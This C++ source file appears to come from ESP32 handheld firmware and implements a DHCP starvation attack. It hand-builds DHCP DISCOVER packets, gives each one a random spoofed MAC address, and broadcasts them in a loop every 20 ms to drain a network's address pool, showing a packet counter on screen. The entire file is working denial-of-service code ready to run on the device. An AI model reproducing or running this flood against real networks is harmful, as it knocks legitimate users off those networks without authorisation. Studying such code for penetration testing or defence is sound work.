#if !defined(LITE_VERSION)
#include "dhcp_starvation.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <DHCP.h>
#include <globals.h>

static volatile bool dhcpRunning = false;
static int packetsSent = 0;

static void sendDhcpDiscover(uint8_t *mac) {
    uint8_t packet[272];
    memset(packet, 0, sizeof(packet));

    packet[0] = 0x01;
    packet[1] = 0x01;
    packet[2] = 0x06;
    packet[3] = 0x00;

    uint32_t xid = random(0x10000000, 0x7FFFFFFF);
    memcpy(&packet[4], &xid, 4);

    packet[8] = 0x00; packet[9] = 0x00; packet[10] = 0x80; packet[11] = 0x00;
    memcpy(&packet[12], mac, 6);
    memset(&packet[18], 0, 202);

    packet[236] = 0x63; packet[237] = 0x82; packet[238] = 0x53; packet[239] = 0x63;

    packet[240] = 0x35; packet[241] = 0x01; packet[242] = 0x01;

    packet[243] = 0x37; packet[244] = 0x0D;
    packet[245] = 0x01; packet[246] = 0x03; packet[247] = 0x06;
    packet[248] = 0x0F; packet[249] = 0x11; packet[250] = 0x1C;
    packet[251] = 0x28; packet[252] = 0x2C; packet[253] = 0x2A;
    packet[254] = 0x02; packet[255] = 0x1F; packet[256] = 0x18;
    packet[257] = 0x2B;

    packet[258] = 0xFF;

    IPAddress broadcast(255, 255, 255, 255);
    WiFiUDP udp;
    if (udp.beginPacket(broadcast, 67)) {
        udp.write(packet, 259);
        udp.endPacket();
    }
}

void dhcpStarvation() {
    if (WiFi.getMode() == WIFI_MODE_NULL) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(100);
    }

    dhcpRunning = true;
    packetsSent = 0;

    drawMainBorderWithTitle("DHCP Starvation");
    int y = 45;

    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, y);
    tft.print("Flooding DHCP server");
    y += 14;
    tft.setCursor(12, y);
    tft.print("with DISCOVER pkts");
    y += 20;

    while (dhcpRunning) {
        uint8_t mac[6];
        for (int i = 0; i < 6; i++) mac[i] = random(256);
        mac[0] &= 0xFE;
        mac[0] |= 0x02;

        sendDhcpDiscover(mac);
        packetsSent++;

        if (packetsSent % 50 == 0) {
            tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
            tft.setCursor(12, y);
            tft.printf("Packets: %d", packetsSent);

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);
        }

        if (check(EscPress)) dhcpRunning = false;
        delay(20);
    }

    displayInfo("Sent " + String(packetsSent) + " DHCP packets", true);
}
#endif
